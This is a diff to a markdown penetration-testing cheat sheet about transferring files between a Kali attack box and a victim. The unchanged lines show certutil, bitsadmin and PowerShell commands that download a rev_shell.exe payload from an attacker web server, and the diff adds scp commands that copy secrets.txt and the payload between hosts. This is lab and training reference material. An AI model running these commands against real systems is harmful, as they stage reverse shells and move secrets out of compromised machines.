@@ -8,6 +8,7 @@
 #### Sender
 
 `python3 -m http.server 8000`
+`python -m SimpleHTTPServer`
 
 #### Receiver
 ##### Linux
@@ -22,7 +23,7 @@
 `certutil -urlcache -split -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe`
 (The -split option in certutil is used to split large files into smaller segments to perform the file transfer.)
 `bitsadmin /transfer job ttp://10.10.10.79:8000/rev_shell.exe C:\Users\Public\rev_shell.exe`
-(Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files.)
+(Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files. <br> The C:\Users\Public\ directory is accessible to all users on a Windows system)
 `powershell wget http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
 `powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.79:8000/rev_shell.exe', 'rev_shell.exe')`
 instantly execute it:
@@ -110,6 +111,18 @@ Kali -> Victim
 impacket-smbserver <server_name> .
 
 ## SSH
+
+### Sender
+
+`scp secrets.txt kali@10.10.10.79:/path/to/dir`
+`scp rev_shell.exe raj@192.168.31.219:/C:/Users/Public`
+
+### Receiver
+
+
+
+scp <remote_username>@(remote_IP):/path/to/<file_name> /path/to/local_dir
+
 | Sending    | Receiving |
 | ------- | ------- |
 | scp <file_name> <remote_username>@<remote_IP>:/path/to/dir | scp <remote_username>@(remote_IP):/path/to/<file_name> /path/to/local_dir |
